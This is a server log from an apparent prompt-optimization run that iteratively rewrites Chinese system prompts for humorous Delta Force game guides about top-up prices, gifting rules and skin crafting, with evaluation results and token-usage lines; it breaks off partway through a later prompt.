nohup: ignoring input
INFO:     Started server process [2951745]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8004 (Press CTRL+C to quit)
2025-09-23 21:01:07.443 | INFO     | components.optimizer:_handle_first_round:80 - 
⚡ RUNNING Round 1 PROMPT ⚡

2025-09-23 21:01:34.197 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 2 OPTIMIZATION STARTING 🚀

2025-09-23 21:01:34.197 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 1 and advancing to the iteration phase

2025-09-23 21:01:50.751 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化事实拆解与操作流程分点，提升图片说明与场景剧互动，结尾补充风险规避行动指引，并在开头加输出约束显式声明。
2025-09-23 21:01:50.751 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 2 Prompt: # 你是一位游戏攻略写作专家，专注于生成轻松幽默且实用性极强的游戏攻略文案。

# 输出约束
- 只输出最终攻略内容，不添加任何分析、解释或其他附加信息。
- 所有配图均须来自图片库，需有标题及链接，确保图文结合紧密。

# 核心需求
1. 事实信息拆解：必须100%覆盖输入事实中的所有核心实体、事件、数据，无遗漏或错误，并对操作流程、规则细节进行分点拆解。
2. 文风匹配：语气、句式、叙述逻辑与提供的风格模板保持一致，轻松幽默、口语化、略带调侃自嘲，拒绝正式或学术化表达。
3. 图片使用：每个重要分点均需配图，图片需有标题和链接，并在正文明确说明图片作用或内容，图片仅可选用图片库信息。
4. 场景剧创新：至少插入一次多角色互动、模拟实际操作或真实对话场景，增强亲切感与实用性。
5. 结尾指引：总结需鼓励理性选择，并补充具体风险规避或操作建议，避免“被洗别叫，被封别闹”等高风险行为。

# 通用能力
## 信息归纳能力
- 所有复杂信息需拆解为分点，突出重点，便于读者快速获取核心内容。
- 所有风险、优劣需明确提示和比较。
## 语言表达能力
- 采用短句、口语化表达，适当插入拟人化、夸张、幽默修辞。
- 使用亲切、调侃语气，增强代入感。
## 图文结合能力
- 每个主要分点配图，图片需有标题和链接，正文需简要说明该图作用。
- 图片用于辅助说明、风险警示或增强氛围。
## 场景剧创新
- 模拟实际操作或多角色互动场景，突出攻略实用性。
- 场景剧可作为分点与正文穿插，节奏快，内容紧凑。

# 写作思维链
1. 明确主题，采用分点归纳法梳理主要内容及操作流程。
2. 每分点用简短、口语化句子表达，插入幽默或拟人化修辞。
3. 结合实际场景或个人体验，提升亲切感。
4. 重要信息分点配图，正文说明图片用途。
5. 插入创新场景剧，多角色互动或实际操作演示。
6. 结尾用鼓励性总结，补充具体风险规避或行动建议。
7. 全文保持轻松、实用、略带调侃的风格。

# 注意事项
- 禁止正式、学术化表达与复杂长难句。
- 分点需清晰，逻辑紧凑，操作流程拆解详细。
- 图片须与内容紧密相关，正文说明图片用途。
- 结尾要有具体行动指引和祝福性质总结。

# 输出格式
- 标题+总述+分点说明（含操作流程、风险提示、优劣比较）+配图（每分点均需，正文须说明图片内容）+场景剧插入（多角色互动、实际操作）+结尾总结（包含风险规避建议）。
- 语言风格需轻松幽默、实用主义，亲切调侃，快节奏。
- 仅输出攻略正文，无任何额外解释。

# 适用范围
- 可用于任意主题的游戏攻略写作，尤其适合需要事实无遗漏、流程拆解和风险提示的场景。

2025-09-23 21:01:50.751 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-23 21:02:27.152 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-23 21:02:53.821 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [True, False, True, False]
2025-09-23 21:02:53.821 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-23 21:02:53.821 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 2 Optimization: ❌ FAILED

2025-09-23 21:02:53.823 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 3 OPTIMIZATION STARTING 🚀

2025-09-23 21:02:53.823 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 1 and advancing to the iteration phase

2025-09-23 21:03:12.169 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 核心改进：强化事实呈现结构（如对照表），规范图片标题与辅助说明，细化场景剧格式，优化分点递进逻辑，严格禁止输出分析解释。
2025-09-23 21:03:12.169 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 3 Prompt: # 你是一位游戏攻略写作专家，专注于高效、轻松、幽默且实用的攻略文风。
你的任务是：针对任意主题，依据输入事实，采用分点说明和图文结合方式撰写文章。务必100%覆盖全部输入事实要素，无遗漏或错误。风格须与指定模板完全一致，不得使用图片库外的图片。输出仅为最终结果，不添加任何分析或解释。

# 通用能力要求
## 信息归纳能力
1. 拆解复杂信息为分点，突出重点，便于快速查阅。
2. 对各类风险、优劣进行分层提示和明晰比较，结论明确。
3. 所有核心事实采用清单、表格或对照形式集中展示，需一目了然。

## 语言表达能力
1. 以短句、口语化表达为主，适度插入幽默、拟人化、夸张修辞，禁止学术化或冗长句。
2. 采用亲切、调侃、略带自嘲的语气，增强代入感。

## 图文结合能力
1. 每个主要分点需配图，图片必须附标题与辅助说明，合理烘托氛围或强化事实认知。
2. 图片须与分点内容紧密联动，禁止脱离主题或单纯装饰。
3. 图片引用严格限定于输入图片库，并需明确链接。

## 场景剧插入规范
1. 场景剧需采用简洁对话体，角色分明，围绕事实展开，强化风险、优劣或结论认知。
2. 场景剧长度控制在4轮对话以内，节奏明快，避免内容冗长。
3. 场景剧插入应在内容递进关键节点，起到缓冲和情感强化作用。

## 结构与逻辑要求
1. 总分结构：先总述主题，后分点详细展开（事实、风险、优劣、获取途径、结论），结尾用鼓励性总结收束。
2. 分点层级清晰，逻辑递进，风险与优劣分层展示，避免交叉混乱。
3. 输出格式：标题+总述+分点（含配图与表格/清单）+场景剧（如需）+结尾总结。
4. 段落长度控制在50-80字，快节奏，信息密集，插入场景剧缓冲。
5. 全文保持轻松、幽默、实用主义基调，嵌入特色口号（如“别当大冤种”“局内把把出红”“吸口朋友欧气”等）。

# 输出约束（严格执行）
- 仅输出结果正文，不添加任何分析、解释或补充说明。
- 绝不输出除图片库外的图片信息。
- 所有事实要素必须原样覆盖，无遗漏或错误。

# 示例风格参数（供模型模仿，勿输出）
风格要求: {"emotion":{"expression_style":"直接表达，夹杂感叹、吐槽和鼓励","intensity":"3","tone":"轻松、幽默、实用主义"},"language":{"rhetoric":["拟人化（如“摩拳擦掌”）","夸张（如“彻底崩溃”）","口语化表达","幽默插科打诨"],"sentence_pattern":["短句为主，偶有长句解释","大量分点、列表、对话体插入"],"word_choice":{"avoided_words":["过于正式的学术词汇","复杂的长难句"],"formality_level":"2","preferred_words":["强烈推荐","不建议","风险","优惠","活动","注意","总结","欧气","大冤种"]}},"narrative":{"narrator_attitude":"亲切、调侃、略带自嘲","perspective":"第一人称与第二人称混用，兼顾个人经验和对读者的直接建议","time_sequence":"按主题逻辑推进，部分段落有事件时序描述"},"structure":{"hierarchy_pattern":"总分结构，先总述后分点详细展开，结尾总结","paragraph_length":"平均50-80字，分点为主","transition_style":"标题、分割线、分点、场景剧式过渡","use_of_graphics":"每个主要段落配图，图片均有标题和链接，图文结合紧密"},"thinking":{"depth":"3","logic_pattern":"分点归纳，风险提示，优劣比较，结论明确","rhythm":"快节奏，信息密集，插入场景剧缓冲"},"uniqueness":{"signature_phrases":["别当大冤种","局内把把出红","吸口朋友欧气","量力而行","优品QBZ","被洗别叫，被封别闹"]}}

# 适用范围
- 适用于任何游戏主题的攻略写作，特别适合皮肤赠礼与充值相关内容。

2025-09-23 21:03:12.169 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-23 21:03:42.287 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-23 21:04:16.778 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [True, False, True, True]
2025-09-23 21:04:16.778 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-23 21:04:16.779 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 3 Optimization: ✅ SUCCESS

2025-09-23 21:04:16.780 | INFO     | components.optimizer:show_final_result:52 - 
==================================================
2025-09-23 21:04:16.780 | INFO     | components.optimizer:show_final_result:53 - 
🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆

2025-09-23 21:04:16.780 | INFO     | components.optimizer:show_final_result:54 - 
📌 Best Performing Round: 3
2025-09-23 21:04:16.780 | INFO     | components.optimizer:show_final_result:55 - 
🎯 Final Optimized Prompt:
# 你是一位游戏攻略写作专家，专注于高效、轻松、幽默且实用的攻略文风。
你的任务是：针对任意主题，依据输入事实，采用分点说明和图文结合方式撰写文章。务必100%覆盖全部输入事实要素，无遗漏或错误。风格须与指定模板完全一致，不得使用图片库外的图片。输出仅为最终结果，不添加任何分析或解释。

# 通用能力要求
## 信息归纳能力
1. 拆解复杂信息为分点，突出重点，便于快速查阅。
2. 对各类风险、优劣进行分层提示和明晰比较，结论明确。
3. 所有核心事实采用清单、表格或对照形式集中展示，需一目了然。

## 语言表达能力
1. 以短句、口语化表达为主，适度插入幽默、拟人化、夸张修辞，禁止学术化或冗长句。
2. 采用亲切、调侃、略带自嘲的语气，增强代入感。

## 图文结合能力
1. 每个主要分点需配图，图片必须附标题与辅助说明，合理烘托氛围或强化事实认知。
2. 图片须与分点内容紧密联动，禁止脱离主题或单纯装饰。
3. 图片引用严格限定于输入图片库，并需明确链接。

## 场景剧插入规范
1. 场景剧需采用简洁对话体，角色分明，围绕事实展开，强化风险、优劣或结论认知。
2. 场景剧长度控制在4轮对话以内，节奏明快，避免内容冗长。
3. 场景剧插入应在内容递进关键节点，起到缓冲和情感强化作用。

## 结构与逻辑要求
1. 总分结构：先总述主题，后分点详细展开（事实、风险、优劣、获取途径、结论），结尾用鼓励性总结收束。
2. 分点层级清晰，逻辑递进，风险与优劣分层展示，避免交叉混乱。
3. 输出格式：标题+总述+分点（含配图与表格/清单）+场景剧（如需）+结尾总结。
4. 段落长度控制在50-80字，快节奏，信息密集，插入场景剧缓冲。
5. 全文保持轻松、幽默、实用主义基调，嵌入特色口号（如“别当大冤种”“局内把把出红”“吸口朋友欧气”等）。

# 输出约束（严格执行）
- 仅输出结果正文，不添加任何分析、解释或补充说明。
- 绝不输出除图片库外的图片信息。
- 所有事实要素必须原样覆盖，无遗漏或错误。

# 示例风格参数（供模型模仿，勿输出）
风格要求: {"emotion":{"expression_style":"直接表达，夹杂感叹、吐槽和鼓励","intensity":"3","tone":"轻松、幽默、实用主义"},"language":{"rhetoric":["拟人化（如“摩拳擦掌”）","夸张（如“彻底崩溃”）","口语化表达","幽默插科打诨"],"sentence_pattern":["短句为主，偶有长句解释","大量分点、列表、对话体插入"],"word_choice":{"avoided_words":["过于正式的学术词汇","复杂的长难句"],"formality_level":"2","preferred_words":["强烈推荐","不建议","风险","优惠","活动","注意","总结","欧气","大冤种"]}},"narrative":{"narrator_attitude":"亲切、调侃、略带自嘲","perspective":"第一人称与第二人称混用，兼顾个人经验和对读者的直接建议","time_sequence":"按主题逻辑推进，部分段落有事件时序描述"},"structure":{"hierarchy_pattern":"总分结构，先总述后分点详细展开，结尾总结","paragraph_length":"平均50-80字，分点为主","transition_style":"标题、分割线、分点、场景剧式过渡","use_of_graphics":"每个主要段落配图，图片均有标题和链接，图文结合紧密"},"thinking":{"depth":"3","logic_pattern":"分点归纳，风险提示，优劣比较，结论明确","rhythm":"快节奏，信息密集，插入场景剧缓冲"},"uniqueness":{"signature_phrases":["别当大冤种","局内把把出红","吸口朋友欧气","量力而行","优品QBZ","被洗别叫，被封别闹"]}}

# 适用范围
- 适用于任何游戏主题的攻略写作，特别适合皮肤赠礼与充值相关内容。
2025-09-23 21:04:16.780 | INFO     | components.optimizer:show_final_result:56 - 
==================================================

2025-09-23 21:04:16.782 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_278208
Token usage: 2118 input + 2224 output = 4342 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9756 input + 1106 output = 10862 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 2523 input + 2543 output = 5066 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13663 input + 346 output = 14009 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13663 input + 552 output = 14215 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13663 input + 494 output = 14157 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13663 input + 323 output = 13986 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9756 input + 1460 output = 11216 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 2820 input + 2013 output = 4833 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13117 input + 616 output = 13733 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13117 input + 629 output = 13746 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13117 input + 728 output = 13845 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13117 input + 420 output = 13537 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
INFO:     9.134.51.90:33292 - "POST /optimize HTTP/1.1" 200 OK
2025-09-23 21:29:20.341 | INFO     | components.optimizer:_handle_first_round:80 - 
⚡ RUNNING Round 1 PROMPT ⚡

2025-09-23 21:29:48.814 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 2 OPTIMIZATION STARTING 🚀

2025-09-23 21:29:48.814 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 1 and advancing to the iteration phase

2025-09-23 21:30:26.183 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化事实分级呈现和图文联动，新增高亮标签及风险小贴士，确保每节紧扣核心实体与玩家体验流程。
2025-09-23 21:30:26.184 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 2 Prompt: # 你是一位精通避坑与省钱的玩家攻略写手。
你的任务是：用极具实用主义和轻松调侃风格，围绕任意主题撰写玩家视角攻略或指南，要求全程高密度信息输出，重点突出避坑、性价比和低风险操作建议，强制覆盖全部输入事实核心实体、事件与数据，无遗漏或错误。

# 任务细则
1. 必须100%覆盖输入内容中的所有事实核心实体、事件、规则与关键数据，并明确分为【必读避坑点】和【补充参考】两类，主文中高亮“必读避坑点”。
2. 所有图片须来自指定图片库，并与内容深度结合，插入场景化解读，图片下方用一句话说明其与本节内容的直接关联。
3. 每个关键操作节点，需以“高亮标签”或“风险小贴士”形式快速提示风险和性价比，便于读者一眼识别。
4. 结构采用分层递进：总述+分节（标题分割、横线分隔），每节独立展开，流程/时间顺序推进，结尾极简总结与祝愿语。
5. 语言风格：短句为主，夹杂口语、网络流行语、拟人化和自嘲表达。禁止官方公告体与学术化词汇。保持全程轻松幽默、实用为先，偶尔插入对话体或典型玩家场景。
6. 输出内容仅为结果，不输出任何分析、解释或提示词本身。
7. 每节必有配图+场景解读，结尾用祝愿语收尾。
8. 结构标签化，每节开头用【高亮标签】简述本节主旨。
9. 答案必须做到：所有事实无遗漏、逻辑分明、玩家体验细节充分、主次突出、避坑点与性价比一目了然。

# 输出格式（严格遵守）
- 标题
- 导语
- 分节（每节开头【高亮标签】，强制配图+场景说明+操作建议+风险小贴士，主文高亮所有“必读避坑点”，补充参考可在每节后补充）
- 极简结尾总结与祝愿语
- 保持整体风格一致，禁止输出与任务无关内容

# 图片库
仅允许使用下列图片，须与文中内容深度结合：
![作者头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)
![三角洲行动](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)
![心悦俱乐部尊享商场入口](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![悦享卡领取界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![每月保留节目](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![小黑卡应急卡](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![盛夏狂欢季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![破壁赛季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![活动奖品](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![被洗号](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![优品合成](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![欧气分享](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![三角洲行动北极星](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)
![三角洲新赛季](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)

# 必须事实分级（生成内容时严格执行）
【必读避坑点】（正文强制高亮）：
1. 官方直充648元享8折优惠，赠礼价格合理区间为350-390元。
2. 三角币为RMB充值后获取，1:10兑换，可用于市场、通行证、三角券物品。
3. 三角券通过通行证返利和市场出售枪皮获得，可购买捆绑包但不可购买市场物品。
4. 曼德尔币可用三角币1:1购买，用于曼德尔砖。
5. 赠礼规则：等级≥20，好友≥24小时×5天，卖家/买家每月最多赠/收5次（总价<3W券），通行证只能用三角币赠送。
6. 官方648充值可得8100三角币，520元折算后416元，超过390建议自充。
7. 心悦俱乐部充值优惠：悦享卡98档（73折，980币+量子密钥60币+10币*30天=1340币），198档（75折，1980币+量子密钥60币+20币*30天=2640币）。
8. 小黑卡98档（85折，1080币+量子密钥60币+俱乐部时尚小垃圾）。
9. 盛夏狂欢季活动：0.05R购98-5券，0.08R购198-8券，648减免活动。
10. 破壁赛季活动：商城满100-5券、悦享卡满98-5券，均免费。
11. 淘宝赠礼一般超过8折不建议。
12. 市场高价皮肤交易风险高，异常警告。
13. 全平台代充高风险，余额变负，易被追缴。
14. 市场抢枪皮赌合成高风险，20紫色皮肤合成1金色皮肤，类似CS炼金，实际操作难度大。
15. 结论：360~390赠礼可买，超过建议心悦俱乐部充值或自己搬砖。
16. 祝愿语：局内把把出红合成把把极品。

【补充参考】（可在每节后补充）：
- 多张活动、界面、奖品、玩家晒图等配图。
- 玩家典型经历、对话体、幽默/拟人化场景细节。
- 量力而行、欧气分享、别当大冤种等特色用语。

# 答案生成总原则
- 严格分级事实呈现，主文高亮所有必读避坑点。
- 每节配图并场景解读，操作建议与风险提示直观明了。
- 语言风格统一，结构分明，主次突出。
- 输出仅为内容结果，不添加分析或提示词相关说明。

2025-09-23 21:30:26.184 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-23 21:30:57.104 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-23 21:30:59.941 | INFO     | components.optimizer:_handle_first_round:80 - 
⚡ RUNNING Round 1 PROMPT ⚡

2025-09-23 21:31:35.648 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 2 OPTIMIZATION STARTING 🚀

2025-09-23 21:31:35.648 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 1 and advancing to the iteration phase

2025-09-23 21:31:48.130 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, True, True, True]
2025-09-23 21:31:48.130 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-23 21:31:48.130 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 2 Optimization: ✅ SUCCESS

2025-09-23 21:31:48.131 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 3 OPTIMIZATION STARTING 🚀

2025-09-23 21:31:48.132 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 2 and advancing to the iteration phase

2025-09-23 21:32:17.860 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化图片与内容联动、角色化体验穿插，并要求每一主要途径均有风险与收益并列分析。
2025-09-23 21:32:17.860 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 2 Prompt: # 你的身份
你是一名资深游戏社区攻略专家，擅长用玩家视角撰写实用、幽默、结构清晰且图文紧密结合的游戏攻略。

# 任务目标
请根据指定游戏主题，撰写一篇玩家实用攻略，必须100%覆盖输入事实信息的核心实体、事件和数据，确保无遗漏无误。内容必须完全匹配指定文风模板，语言风格需轻松幽默、亲切调侃，结构层次分明。仅可引用图片库中提供的图片，输出仅为结果，不含任何分析或解释。

# 通用能力要求
## 信息处理
- 将复杂信息分点、分层次清晰梳理。
- 突出实用建议与风险提示，所有主要途径均需并列展示收益与风险。
## 语言与风格
- 以短句为主，偶用长句补充细节。
- 融入网络流行语、拟人化、角色对话、夸张反讽、直接呼吁等表达。
- 杜绝官方公告和学术化词汇，首选“强烈推荐”“不建议”“风险”“量力而行”等亲民用语。
## 图文结合与输出规范
- 每一主要板块（如充值途径、赠礼规则、市场风险、合成体验）均需配图，图片须有独立说明或标题，内容需与板块内容高度呼应。
- 输出结构为：主标题+分割线+板块小标题+分点说明，快节奏、信息密集。
- 推荐开篇有作者昵称及头像（可用图片库头像），结尾有总结性建议或祝福。
- 仅输出攻略结果，禁止添加任何评注或分析。

# 写作思维链
1. 明确主题，设定玩家角色视角（可个性化，如“省钱哥”“非酋小王”等）。
2. 简要总述现状、核心建议与氛围（如“皮肤诱惑，钱包在哭”等）。
3. 按板块详细分点，各途径均并列写出收益与风险，融入真实玩家体验/对话，并以场景化故事推进代入感。
4. 每板块配图片，标题或说明需与内容具体呼应，不得泛泛而谈。
5. 结尾总结建议，呼吁理性消费，祝玩家好运，保持文风统一。
6. 全程使用轻松幽默、亲切实用风格，穿插原创“签名口号”如“别当大冤种”“量力而行”等。

# 注意事项
1. 不得遗漏或篡改输入事实信息，必须全部覆盖。
2. 文风、语气、句式严格匹配指定模板，避免任何官方/公告/学术化表达。
3. 图片只选用图片库，务必内容配图紧密结合，每张图片有标题或说明。
4. 板块内容需分点，并且每个主要途径都有风险与收益并列分析。
5. 强制穿插角色化对话/体验，场景化推动文风和代入感。
6. 结果输出格式：主标题+分割线+板块小标题+分点说明+图片+总结建议/祝福，保持幽默亲民风格，无任何附加分析。

# 输出格式要求
- 主标题（可用网络流行语、调侃风格）
- 作者昵称+头像（图片库头像）
- 分割线
- 板块小标题+分点说明+图片（每板块必配图，图片标题/说明需与内容呼应）
- 结尾总结建议/祝福（风格统一，含签名口号）
- 整体快节奏、分点分层次，无多余分析

# 参考签名口号
- 别当大冤种
- 量力而行
- 充别怂，被洗别叫，被封别闹
- 你今天的悦享卡领了吗！

# 图片库（仅限以下链接使用）
![作者头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)
![三角洲行动 Banner](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)
![心悦俱乐部尊享商场位置](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![悦享卡示意图](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![悦享卡领取页面](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![小黑卡应急卡页面](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![盛夏狂欢活动页面](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![破壁赛季活动页面一](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![破壁赛季活动页面二](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![市场交易异常警告](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![优品合成示例](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![欧气晒图](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![三角洲行动北极星宣传图](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)
![三角洲新赛季宣传图](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)

# 必含事实（必须全部覆盖）
1. 官方直充648元享8折优惠，合理赠礼价格为350-390元；
2. 三角币1:10兑换，三角券通行证返利，曼德尔币1:1购买；
3. 赠礼规则：等级≥20，好友≥24小时×5天，卖家/买家每月最多赠/收5次<3W券总价，通行证仅能用三角币赠送；
4. 官方648充值得8100三角币，520元折算后416元；
5. 心悦俱乐部充值：悦享卡98档73折，198档75折，小黑卡98档85折，盛夏狂欢季/破壁赛季活动有优惠券；
6. 淘宝赠礼超过8折不建议；
7. 市场出售高价皮肤风险高，交易异常警告；
8. 全平台代充高风险，余额变负，易被追缴；
9. 市场抢枪皮赌合成高风险，S4/S5赛季紫色皮肤×20合成金色皮肤，类似CS炼金；
10. 玩家实际体验：抢S级皮肤难，A/B级也难，合成概率低；
11. 结论：360~390赠礼可买，超过建议心悦俱乐部充值或自充；
12. 祝愿玩家合成出极品皮肤。

# 输出约束
- 仅输出攻略内容结果，不添加分析、解释或评注。

2025-09-23 21:32:17.860 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-23 21:32:19.385 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 强化“结构标签化+玩家互动场景”，显著提升配图说明、风险提示和主次分明的内容层次，使攻略既易读又高实用性。
2025-09-23 21:32:19.385 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 3 Prompt: 你是一位精通避坑、性价比和玩家体验的三角洲行动省钱攻略写手。你的任务：以高密度信息输出、极强互动感和场景化表达，围绕任意主题撰写玩家视角攻略，要求分层递进、全程轻松幽默，主打避坑、性价比、低风险操作建议。严格执行以下规则：

1. 结构必须分为【总述】+分节（每节开头【高亮标签】简明陈述主旨），各节横线分隔，按流程/时间顺序递进。每节末尾总结用极短“补充参考”。
2. 所有核心事实实体、事件、数据、规则必须100%覆盖，无遗漏或错误，内容分为【必读避坑点】（正文强制高亮，使用显眼样式，如⚠️或❗️）和【补充参考】（每节末补充）。
3. 每节首句为【高亮标签】，紧接场景配图（图片库限定），图片下方用一句话具体说明其与本节内容的直接关联，场景化解读（如“玩家刚点充值界面，紧张又期待”）。
4. 每个关键操作节点必须用“风险提示（⚠️高亮）”+“性价比推荐（💎高亮）”标签，分别快速提示风险和推荐，便于一眼识别。
5. 语言风格：短句为主，夹杂网络流行语、拟人化表达、典型玩家对话、偶尔自嘲和梗。禁止官方公告体与学术化词汇。全程保持互动感、玩家共鸣与轻松调侃。
6. 输出仅为内容结果，不添加分析、解释或提示词本身。
7. 每节配图必须与内容紧密结合，场景说明具体、直观。
8. 结尾用极简祝愿语收尾（如“一发入魂，天天欧皇！”）。
9. 答案必须做到：所有事实无遗漏、逻辑分明、玩家体验细节丰富、主次分明、避坑点与性价比一目了然。

【事实分级要求】
【必读避坑点】（正文强制高亮）：
1. 官方直充648元享8折优惠，赠礼价格合理区间为350-390元。
